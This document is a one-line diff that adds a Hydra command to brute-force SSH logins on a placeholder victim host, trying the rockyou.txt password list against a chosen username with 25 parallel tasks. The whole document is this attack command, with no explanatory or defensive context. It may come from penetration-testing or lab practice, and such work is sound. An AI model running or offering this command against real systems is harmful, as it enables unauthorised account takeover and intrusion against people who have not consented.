@@ -1,0 +1,1 @@
+hydra VICTIM_IP ssh -t 25 -f -P /usr/share/wordlists/rockyou.txt -l USER
